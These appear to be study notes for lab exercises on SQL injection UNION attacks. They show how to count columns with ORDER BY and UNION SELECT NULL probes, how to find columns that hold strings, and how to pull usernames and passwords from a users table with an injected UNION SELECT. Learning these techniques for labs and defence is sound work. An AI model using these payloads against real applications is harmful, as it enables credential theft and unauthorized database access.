## union  attack use case briefly
<br>

When an application is **vulnerable to SQL injection** and the** results of the query are returned within the application's responses**, the `UNION` keyword ***can be used to retrieve data from other tables within the database***. This results in an SQL injection UNION attack.

<br>

## Union attack Requisites:
1. Have sql injection point
2. The sql query result must show in the response or response page.

<br>



### union attack use case 1-1 :    Determining the number of columns required in an SQL injection UNION attack

How to get column numbers in a specific table without entering the database?
One method is using order by.


```sql
select * from test_table order by 1
select * from test_table order by 1,2
select * from test_table order by 1,2,3
select * from test_table order by 1,2,3,4.......
```

If `test_table` only have 3 columns, then the below sql query will cause an database error:
`The ORDER BY position number 4 is out of range of the number of items in the select list.`

```sql
select * from test_table order by 1,2,3,4
```
Then based on the error and number, we can know how much columns have in one table.

<br>

The other method is using `UNION` keyword.

similar to `order by`, `UNION` adds `UNION` statement after one sql query.
For instance:
```sql
select * from test_table union select null
select * from test_table union select null,null
select * from test_table union select null,null,null
select * from test_table union select null,null,null,null......
```

If the `test_table` only have 3 columns,then sql query 
```sql
select * from test_table union select null,null,null,null
select * from test_table union select null,null
select * from test_table union select null
```
will cause an database error.

#### exercise about this topic
[[lab3]]

<br>

<br>


###  Union select use case 1-2: Finding columns with a useful data type in an SQL injection UNION attack

Now we know how many columns in the table. But we don't know each column's data type yet. How to know that ?

Suppose we have four columns.And suppose we need to know which column's data type is string.
<br>

```sql
union select 'a',null,null,null 
union select null,'a',null,null 
union select null,null,'a',null 
union select null,null,null,'a' 
```


If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:

`Conversion failed when converting the varchar value 'a' to data type int.`

**If an error does not occur**, and the **application's response contains some additional content including the injected string value**, then the relevant column is suitable for retrieving string data.


#### exercise about this topic

[[lab4]]

<br>

### Use case 1-3:  Using an SQL injection UNION attack to retrieve interesting data

If union selected column numbers and data type same as current table,then we can add a union select statement to retrieve other table's data.

```sql
select col1,col2 from test_table where category = 'Gifts' 
union select username,password from users
```
Suppose test_table's col1,col2 are string type. In this case,we can get all user's username and password.

#### exercise about this topic

[[lab5]]


#union_attack